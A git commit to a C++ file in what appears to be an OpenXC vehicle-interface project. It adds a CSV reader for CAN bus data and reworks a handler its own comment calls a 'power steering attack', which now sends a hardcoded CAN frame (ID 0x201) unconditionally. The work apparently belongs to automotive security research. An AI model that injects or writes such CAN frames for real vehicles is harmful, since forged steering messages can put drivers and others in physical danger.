72e73b8ba3b686b6316489c4e3432dbfc7133b05
kal667 <kkelly.667@gmail.com>
2016-08-25 14:36:40 -0400

    Added a second read function that reads in each column as a string. This can be used to determing MS or HS CAN bus for each signal.

--- my_handlers.cpp
+++ my_handlers.cpp
@@ -10,6 +10,7 @@ using openxc::can::lookupSignal;
 #include <sstream>
 #include <stdlib.h>
 
+//reads in Hex values (CAN transmit bytes) as ints
 std::vector<std::vector<int> > readCSV() {
 
    std::vector<std::vector<int> > array;
@@ -41,6 +42,37 @@ std::vector<std::vector<int> > readCSV() {
    return array;
 }
 
+//reads in CAN Bus (MS or HS) as string
+std::vector<std::vector<std::string> > readCSV2() {
+
+   std::vector<std::vector<std::string> > array;
+   std::ifstream file( "power_steering.csv" );
+   std::string line; 
+
+   if (!file.is_open())
+   {
+      return array;
+   }
+
+   for (int i = 1; i < 98; i++){
+      std::getline(file, line); // skip the first 97 lines
+   }
+
+   while( std::getline( file, line ) ) {
+
+      std::istringstream iss( line );
+      std::string result;
+
+      std::vector<std::string> a2;
+      while( std::getline( iss, result, ',' ) ) {
+         a2.push_back(result);
+      }
+
+      array.push_back(a2);
+   }
+
+   return array;
+}
 
 //Handler to conduct power steering attack
 void powerSteeringHandler(const char* name, openxc_DynamicField* value,
@@ -48,21 +80,14 @@ void powerSteeringHandler(const char* name, openxc_DynamicField* value,
 
 	CanMessage can_message = {0};
 	CanBus* bus = openxc::can::lookupBus(1, openxc::signals::getCanBuses(), openxc::signals::getCanBusCount());
-	const bool attack = value->boolean_value;
+	//const bool attack = value->boolean_value;
 
-	uint64_t can_value = {0};
-	CanSignal* rpmSignal = lookupSignal("set_rpm", signals,
-		signalCount);
+	//std::vector<std::vector<int> > array = readCSV(); //Arbitration ID in column 9, Transmit Bytes in columns 12-19
+	//std::vector<std::vector<std::string> > array2 = readCSV2(); //CAN Bus column 7
+	can_message = {0x201, STANDARD, {0x2B, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 8};
 
-	int **array;
-	if (attack == true) {
+	can::write::sendCanMessage(bus, &can_message);
+	//can::write::enqueueMessage(bus, &can_message);
+	//can::write::flushOutgoingCanMessageQueue(bus);
 
-		array = readCSV();
-		can_value = 0x4E;
-		can_message = {0x201, STANDARD, {0x2B, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 8};
-	
-		can::write::enqueueMessage(bus, &can_message);
-		can::write::flushOutgoingCanMessageQueue(bus);
-		can::write::sendEncodedSignal(rpmSignal, can_value, true);
-	}
 }
